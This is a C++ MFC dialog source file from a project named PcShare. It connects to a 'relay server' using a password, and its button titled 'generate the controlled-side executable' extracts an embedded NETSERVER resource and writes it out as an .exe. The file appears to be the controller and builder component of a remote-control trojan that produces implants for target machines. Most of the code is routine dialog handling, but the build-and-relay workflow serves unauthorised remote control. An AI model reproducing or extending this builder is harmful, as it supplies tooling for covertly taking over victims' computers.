// MyToServerDlg.cpp : implementation file
//

#include "stdafx.h"
#include "PcShare.h"
#include "MyToServerDlg.h"
#include "MainFrm.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CMyToServerDlg dialog


CMyToServerDlg::CMyToServerDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CMyToServerDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CMyToServerDlg)
	m_ServerAddr = _T("");
	m_ServerPort = _T("");
	m_ServerPass = _T("");
	//}}AFX_DATA_INIT
	m_CmdSocket = NULL;
	m_IsExit = NULL;
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CMyToServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMyToServerDlg)
	DDX_Text(pDX, IDC_EDIT_SERVERADDR, m_ServerAddr);
	DDX_Text(pDX, IDC_EDIT_SERVERPORT, m_ServerPort);
	DDX_Text(pDX, IDC_EDIT_PWD, m_ServerPass);
	DDV_MaxChars(pDX, m_ServerPass, 9);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CMyToServerDlg, CDialog)
	//{{AFX_MSG_MAP(CMyToServerDlg)
	ON_BN_CLICKED(IDCONNECT, OnConnect)
	ON_BN_CLICKED(IDC_BUTTON_CREAT_SERVER, OnButtonCreatServer)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	//}}AFX_MSG_MAP
	ON_MESSAGE(WM_CONNECT_EXIT, OnConnectExit)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMyToServerDlg message handlers

void CMyToServerDlg::OnOK() 
{
	if(m_IsExit)
	{
		CDialog::OnOK();
	}
}

void CMyToServerDlg::OnConnect() 
{
	UpdateData();
	if(m_ServerAddr.IsEmpty() || m_ServerPort.IsEmpty())
	{
		return;
	}

	WritePrivateProfileString(PS_SHEZHI, _T("中转服务器地址"), m_ServerAddr, GetIniFileName());
	WritePrivateProfileString(PS_SHEZHI, _T("中转服务器端口"), m_ServerPort, GetIniFileName());

	GetDlgItem(IDCONNECT)->EnableWindow(FALSE);
	GetDlgItem(IDC_EDIT_SERVERADDR)->EnableWindow(FALSE);
	GetDlgItem(IDC_EDIT_SERVERPORT)->EnableWindow(FALSE);
	GetDlgItem(IDC_EDIT_PWD)->EnableWindow(FALSE);

	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) DoConnectThread, (LPVOID) this, 0, NULL);
}

void CMyToServerDlg::DoConnect()
{
	PROXYLOGININFO m_Info = {0};
	DWORD nServerPort = StrToInt(m_ServerPort);
	char m_cServerAddr[256] = {0};
	WideCharToMultiByte(CP_ACP, 0,	m_ServerAddr, lstrlen(m_ServerAddr) + 1, m_cServerAddr, 256, NULL, NULL);
	SOCKET m_Socket = CMainFrame::GetConnectSocket(m_cServerAddr, nServerPort);
	if(m_Socket != NULL)
	{
		m_Info.m_Cmd = P_CONNECT_CMD;
		m_Info.m_Data = StrToInt(m_ServerPass);
		if(send(m_Socket, (char*) &m_Info, sizeof(PROXYLOGININFO), 0) == SOCKET_ERROR ||
			recv(m_Socket, (char*) &m_Info, sizeof(PROXYLOGININFO), 0) == SOCKET_ERROR)
		{
			closesocket(m_Socket);
			m_Info.m_Cmd = 0;
		}
	}
	PostMessage(WM_CONNECT_EXIT, (WPARAM) m_Socket, m_Info.m_Cmd);
}

LRESULT CMyToServerDlg::OnConnectExit(WPARAM wParam, LPARAM lParam)
{
	if(lParam == P_CONNECT_SUCCESS)
	{
		m_CmdSocket = (SOCKET) wParam;
		m_IsExit = TRUE;
		PostMessage(WM_COMMAND, (WPARAM) IDOK, 0);
		return TRUE;
	}
	else if(lParam == P_CONNECT_ERROR)
	{
		MessageBox(_T("密码错误"), _T("警告"));
	}
	else
	{
		MessageBox(_T("连接到中转服务器失败！"), _T("错误"));
	}

	GetDlgItem(IDCONNECT)->EnableWindow(TRUE);
	GetDlgItem(IDC_EDIT_SERVERADDR)->EnableWindow(TRUE);
	GetDlgItem(IDC_EDIT_SERVERPORT)->EnableWindow(TRUE);
	GetDlgItem(IDC_EDIT_PWD)->EnableWindow(TRUE);
	return TRUE;
}

DWORD CMyToServerDlg::DoConnectThread(LPVOID lPvoid)
{
	CMyToServerDlg* pThis = (CMyToServerDlg*) lPvoid;
	pThis->DoConnect();
	return 0;
}

BOOL CMyToServerDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	TCHAR m_sServerAddr[100] = {0};
	GetPrivateProfileString(PS_SHEZHI, _T("中转服务器地址"), _T(""), m_sServerAddr, 99, GetIniFileName());
	m_ServerAddr = m_sServerAddr;

	TCHAR m_sPort[100] = {0};
	GetPrivateProfileString(PS_SHEZHI, _T("中转服务器端口"), _T(""), m_sPort, 99, GetIniFileName());
	m_ServerPort = m_sPort;

	UpdateData(FALSE);

	CString m_VerInfo;
	m_VerInfo.Format(_T("%016d"), PS_USER_ID);
	TCHAR m_Title[256] = {0};
	wsprintf(m_Title, _T("%s%s[%s]"), PS_TITLE, _T(PS_VER_INFO), m_VerInfo.Right(4));
	SetWindowText(m_Title);
	return TRUE; 
}

void CMyToServerDlg::OnButtonCreatServer() 
{
	OPENFILENAME OpenFileName = {0};
	TCHAR szFile[MAX_PATH] = {0};
  	TCHAR szFilter[1024] = {0};
	lstrcpy(szFilter, _T("可执行文件(*.exe)"));
	lstrcpy(szFilter + lstrlen(szFilter) + 1, _T("*.exe"));
	OpenFileName.lStructSize       = sizeof(OPENFILENAME);
    OpenFileName.hwndOwner         = GetSafeHwnd();
	OpenFileName.lpstrFilter       = szFilter;
    OpenFileName.lpstrCustomFilter = NULL;
    OpenFileName.nMaxCustFilter    = 0;
    OpenFileName.nFilterIndex      = 0;
    OpenFileName.lpstrFile         = szFile;
    OpenFileName.nMaxFile          = sizeof(szFile);
    OpenFileName.lpstrFileTitle    = NULL;
    OpenFileName.nMaxFileTitle     = 0;
    OpenFileName.lpstrInitialDir   = NULL;
    OpenFileName.lpstrTitle        = _T("生成被控制端可执行文件");
    OpenFileName.nFileOffset       = 0;
    OpenFileName.nFileExtension    = 0;
    OpenFileName.lpstrDefExt       = _T("exe");
    OpenFileName.Flags             = OFN_EXPLORER | OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT;
	if(!GetSaveFileName(&OpenFileName))
	{
		return ;
	}

	DWORD nLen = 0;
	LPBYTE pData  = GetMyExeSource(_T("NETSERVER"), _T("MOD"), nLen);
	if(pData != NULL)
	{
		WriteMyFile(szFile, pData, nLen);
	}
}

void CMyToServerDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

HCURSOR CMyToServerDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}
